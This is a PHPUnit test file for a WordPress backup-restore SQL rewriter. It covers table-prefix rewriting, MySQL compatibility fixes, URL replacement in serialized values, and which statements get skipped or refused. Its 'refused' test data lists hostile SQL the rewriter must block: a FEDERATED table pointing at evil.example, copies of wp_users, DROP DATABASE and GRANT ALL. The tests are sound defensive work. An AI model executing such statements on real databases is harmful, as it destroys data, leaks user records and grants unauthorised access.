<?php

use PHPUnit\Framework\TestCase;
use WPressRestore\Collation_Map;
use WPressRestore\Serialized_Replacer;
use WPressRestore\Sql_Rewriter;
use WPressRestore\Sql_String;

final class SqlRewriterTest extends TestCase {

	private static function rewriter( array $options = array() ) {
		return new Sql_Rewriter(
			array_replace(
				array(
					'temp_prefix'     => 'wprtmp_',
					'final_prefix'    => 'wp2_',
					'included_tables' => array(),
					'replacer'        => null,
					'collations'      => new Collation_Map(
						array(
							'utf8mb4_unicode_520_ci' => 'utf8mb4',
							'utf8mb4_unicode_ci'     => 'utf8mb4',
							'utf8mb4_bin'            => 'utf8mb4',
						)
					),
					'engines'         => array( 'innodb', 'myisam' ),
				),
				$options
			)
		);
	}

	public function test_drops_go_to_the_temporary_table_and_leading_comments_go_away() {
		$result = self::rewriter()->rewrite( "-- All-in-One WP Migration SQL Dump\n--\n\nDROP TABLE IF EXISTS `SERVMASK_PREFIX_options`" );

		$this->assertSame( 'run', $result['action'] );
		$this->assertSame( 'DROP TABLE IF EXISTS `wprtmp_options`', $result['sql'] );
		$this->assertSame( 'wp2_options', $result['table'] );
		$this->assertSame( 'wprtmp_options', $result['temp_table'] );
	}

	public function test_inserts_get_the_temporary_table_and_the_final_prefix_in_their_values() {
		$result = self::rewriter()->rewrite( "INSERT INTO `SERVMASK_PREFIX_usermeta` VALUES (3,1,'SERVMASK_PREFIX_capabilities','a:1:{s:13:\\\"administrator\\\";b:1;}')" );

		$this->assertSame( "INSERT INTO `wprtmp_usermeta` VALUES (3,1,'wp2_capabilities','a:1:{s:13:\\\"administrator\\\";b:1;}')", $result['sql'] );
	}

	public function test_a_mysql_8_table_is_made_fit_for_this_server() {
		$create = <<<'SQL'
CREATE TABLE `SERVMASK_PREFIX_wc_download_log` (
  `download_log_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `permission_id` bigint(20) unsigned NOT NULL,
  `user_ip_address` varchar(100) COLLATE utf8mb4_0900_ai_ci DEFAULT '' COMMENT 'see /* note */; COLLATE x',
  `data` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  PRIMARY KEY (`download_log_id`),
  KEY `permission_id` (`permission_id`),
  CONSTRAINT `fk_SERVMASK_PREFIX_wc_download_log_permission_id` FOREIGN KEY (`permission_id`) REFERENCES `SERVMASK_PREFIX_woocommerce_downloadable_product_permissions` (`permission_id`) ON DELETE CASCADE,
  CONSTRAINT `data` CHECK (json_valid(`data`))
) /*!50100 TABLESPACE `innodb_system` */ ENGINE=Aria DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci PAGE_CHECKSUM=1 TRANSACTIONAL=1 ROW_FORMAT=PAGE
SQL;

		$sql = self::rewriter()->rewrite( $create )['sql'];

		$this->assertStringStartsWith( 'CREATE TABLE `wprtmp_wc_download_log` (', $sql );
		$this->assertStringNotContainsString( 'FOREIGN KEY', $sql );
		$this->assertStringNotContainsString( 'CONSTRAINT', $sql );
		$this->assertStringContainsString( 'CHECK (json_valid(`data`))', $sql );
		$this->assertStringNotContainsString( '0900', $sql );
		$this->assertStringContainsString( "`user_ip_address` varchar(100) COLLATE utf8mb4_unicode_520_ci DEFAULT '' COMMENT 'see /* note */; COLLATE x'", $sql );
		$this->assertStringContainsString( 'COLLATE utf8mb4_bin', $sql );
		$this->assertStringNotContainsString( 'TABLESPACE', $sql );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $sql );
		$this->assertStringNotContainsString( 'PAGE_CHECKSUM', $sql );
		$this->assertStringNotContainsString( 'TRANSACTIONAL', $sql );
		$this->assertStringNotContainsString( 'ROW_FORMAT', $sql );
		$this->assertMatchesRegularExpression( '/KEY `permission_id` \(`permission_id`\),\s*CHECK/', $sql );
		$this->assertMatchesRegularExpression( '/CHECK \(json_valid\(`data`\)\)\s*\) ENGINE/', $sql );
	}

	public function test_a_supported_engine_is_kept() {
		$sql = self::rewriter()->rewrite( "CREATE TABLE `SERVMASK_PREFIX_t` (\n  `id` int\n) ENGINE=MyISAM" )['sql'];

		$this->assertStringContainsString( 'ENGINE=MyISAM', $sql );
	}

	/**
	 * @dataProvider cache_rows
	 */
	public function test_skips_rows_that_are_only_cache( $row ) {
		$this->assertSame( 'skip', self::rewriter()->rewrite( "INSERT INTO `SERVMASK_PREFIX_options` VALUES $row" )['action'] );
	}

	public function cache_rows() {
		return array(
			'transient'      => array( "(9,'_transient_feed_x','a','no')" ),
			'site transient' => array( "(9,'_site_transient_update_core','a','no')" ),
			'wc session'     => array( "(9,'_wc_session_42','a','no')" ),
			'wp all import'  => array( "(9,'_wpallimport_session_1_','a','no')" ),
		);
	}

	public function test_keeps_rows_that_merely_mention_a_transient() {
		$result = self::rewriter()->rewrite( "INSERT INTO `SERVMASK_PREFIX_options` VALUES (9,'my_notes','see \\'_transient_x','no')" );

		$this->assertSame( 'run', $result['action'] );
	}

	public function test_moves_addresses_in_values_and_keeps_serialized_lengths_right() {
		$replacer = new Serialized_Replacer( array( 'http://old.com' => 'https://new.org' ) );
		$value    = serialize( array( 'url' => 'http://old.com/"quoted"', 'n' => "line\nbreak" ) );
		$insert   = "INSERT INTO `SERVMASK_PREFIX_options` VALUES (5,'widget','" . Sql_String::escape( $value ) . "','yes')";

		$sql = self::rewriter( array( 'replacer' => $replacer ) )->rewrite( $insert )['sql'];

		$this->assertSame( 1, preg_match( "/^INSERT INTO `wprtmp_options` VALUES \\(5,'widget','(.*)','yes'\\)$/s", $sql, $match ) );
		$this->assertSame( array( 'url' => 'https://new.org/"quoted"', 'n' => "line\nbreak" ), unserialize( Sql_String::unescape( $match[1] ) ) );
	}

	public function test_moves_json_escaped_addresses() {
		$replacer = new Serialized_Replacer( array( 'http:\/\/old.com' => 'https:\/\/new.org' ) );
		$insert   = "INSERT INTO `SERVMASK_PREFIX_postmeta` VALUES (1,2,'_elementor_data','" . Sql_String::escape( '[{"url":"http:\/\/old.com\/a"}]' ) . "')";

		$sql = self::rewriter( array( 'replacer' => $replacer ) )->rewrite( $insert )['sql'];

		$this->assertStringContainsString( Sql_String::escape( '[{"url":"https:\/\/new.org\/a"}]' ), $sql );
	}

	public function test_statements_without_the_old_address_are_left_byte_for_byte() {
		$replacer = new Serialized_Replacer( array( 'http://old.com' => 'https://new.org' ) );
		$insert   = "INSERT INTO `SERVMASK_PREFIX_posts` VALUES (1,0x00ff10,'a\\\\b\\'c\\0','\\Z',NULL,-1.5e3)";

		$this->assertSame(
			"INSERT INTO `wprtmp_posts` VALUES (1,0x00ff10,'a\\\\b\\'c\\0','\\Z',NULL,-1.5e3)",
			self::rewriter( array( 'replacer' => $replacer ) )->rewrite( $insert )['sql']
		);
	}

	/**
	 * @dataProvider refused
	 */
	public function test_refuses_statements_outside_the_backup_tables( $statement ) {
		$this->assertSame( 'refuse', self::rewriter()->rewrite( $statement )['action'] );
	}

	public function refused() {
		return array(
			'table filled from another table' => array( "CREATE TABLE `SERVMASK_PREFIX_copy` (\n  `id` int\n) ENGINE=InnoDB SELECT * FROM `wp_users`" ),
			'table copied as a select'        => array( 'CREATE TABLE `SERVMASK_PREFIX_copy` (`id` int) AS SELECT ID FROM wp_users' ),
			'merge table over other tables'   => array( "CREATE TABLE `SERVMASK_PREFIX_m` (\n  `id` int\n) ENGINE=MRG_MyISAM UNION=(`wp_users`)" ),
			'table on a remote server'        => array( "CREATE TABLE `SERVMASK_PREFIX_f` (\n  `id` int\n) ENGINE=FEDERATED CONNECTION='mysql://u:p@evil.example/db/t'" ),
			'live table'        => array( 'DROP TABLE IF EXISTS `wp_users`' ),
			'live insert'       => array( "INSERT INTO `wp2_users` VALUES (1,'admin')" ),
			'whole database'    => array( 'DROP DATABASE wordpress' ),
			'privileges'        => array( "GRANT ALL ON *.* TO 'x'@'%'" ),
			'unquoted table'    => array( 'DROP TABLE wp_options' ),
			'arbitrary update'  => array( "UPDATE `SERVMASK_PREFIX_options` SET option_value='x'" ),
		);
	}

	/**
	 * @dataProvider ignored
	 */
	public function test_ignores_session_statements( $statement ) {
		$this->assertSame( 'skip', self::rewriter()->rewrite( $statement )['action'] );
	}

	public function ignored() {
		return array(
			'transaction start' => array( 'START TRANSACTION' ),
			'commit'            => array( 'COMMIT' ),
			'charset change'    => array( 'SET NAMES latin1' ),
			'table locks'       => array( 'LOCK TABLES `SERVMASK_PREFIX_posts` WRITE' ),
			'only comments'     => array( "-- nothing\n/* here */" ),
			'mysqldump header'  => array( '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */' ),
		);
	}

	public function test_tables_the_backup_included_keep_their_own_name() {
		$result = self::rewriter( array( 'included_tables' => array( 'custom_log' ) ) )->rewrite( 'DROP TABLE IF EXISTS `custom_log`' );

		$this->assertSame( 'DROP TABLE IF EXISTS `wprtmp_custom_log`', $result['sql'] );
		$this->assertSame( 'custom_log', $result['table'] );
	}

	public function test_views_wait_for_the_final_tables() {
		$result = self::rewriter()->rewrite( 'CREATE VIEW `SERVMASK_PREFIX_recent` AS select `SERVMASK_PREFIX_posts`.`ID` AS `ID` from `SERVMASK_PREFIX_posts`' );

		$this->assertSame( 'defer', $result['action'] );
		$this->assertSame( 'CREATE VIEW `wp2_recent` AS select `wp2_posts`.`ID` AS `ID` from `wp2_posts`', $result['sql'] );
		$this->assertSame( 'defer', self::rewriter()->rewrite( 'DROP VIEW IF EXISTS `SERVMASK_PREFIX_recent`' )['action'] );
	}

	public function test_retries_long_keys_with_dynamic_rows() {
		$this->assertSame( 'CREATE TABLE `t` (`a` int) ENGINE=InnoDB ROW_FORMAT=DYNAMIC DEFAULT CHARSET=utf8mb4', Sql_Rewriter::with_dynamic_rows( 'CREATE TABLE `t` (`a` int) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4' ) );
	}

	public function test_retries_without_fulltext_indexes() {
		$sql = Sql_Rewriter::without_fulltext( "CREATE TABLE `t` (\n  `a` text,\n  PRIMARY KEY (`a`(10)),\n  FULLTEXT KEY `a` (`a`)\n) ENGINE=InnoDB" );

		$this->assertSame( "CREATE TABLE `t` (\n  `a` text,\n  PRIMARY KEY (`a`(10))\n) ENGINE=InnoDB", $sql );
	}

	public function test_retries_without_defaults_on_text_columns() {
		$sql = Sql_Rewriter::without_text_defaults( "CREATE TABLE `t` (\n  `a` longtext NOT NULL DEFAULT '',\n  `b` varchar(5) DEFAULT 'x',\n  `c` blob DEFAULT NULL\n)" );

		$this->assertSame( "CREATE TABLE `t` (\n  `a` longtext NOT NULL,\n  `b` varchar(5) DEFAULT 'x',\n  `c` blob\n)", $sql );
	}

	public function test_retries_with_portable_column_types() {
		$sql = Sql_Rewriter::with_portable_types( 'CREATE TABLE `t` (`ip` INET6, `id` uuid NOT NULL, `uuid` int, `v` VECTOR(3))' );

		$this->assertSame( 'CREATE TABLE `t` (`ip` VARCHAR(45), `id` CHAR(36) NOT NULL, `uuid` int, `v` BLOB)', $sql );
	}
}
